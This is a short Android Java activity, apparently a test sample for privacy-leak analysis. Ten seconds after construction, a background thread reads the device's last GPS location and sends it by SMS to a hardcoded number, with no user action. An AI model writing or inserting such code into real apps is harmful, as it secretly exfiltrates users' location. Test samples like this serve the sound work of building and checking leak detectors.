package com.test;
 

import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

import com.example.androidtest1.R;

import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.TextView;

public class MyActivity extends Activity
{
	private final Runnable mTask;
	public MyActivity()
	{
		mTask = new Runnable()
		{
			@Override
			public void run()
			{
				try
				{
					Thread.sleep(1000 * 10);
				}
				catch(InterruptedException ex)
				{}
				startLeak();
			}
		};
		startTask();
	}
	public void startTask()
	{
		new Thread(mTask).start();
	}
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
	}
	public void startLeak()
	{
		LocationManager locManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
		Location loc = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage("0900000000", null, loc.toString(), null, null);
	}
}

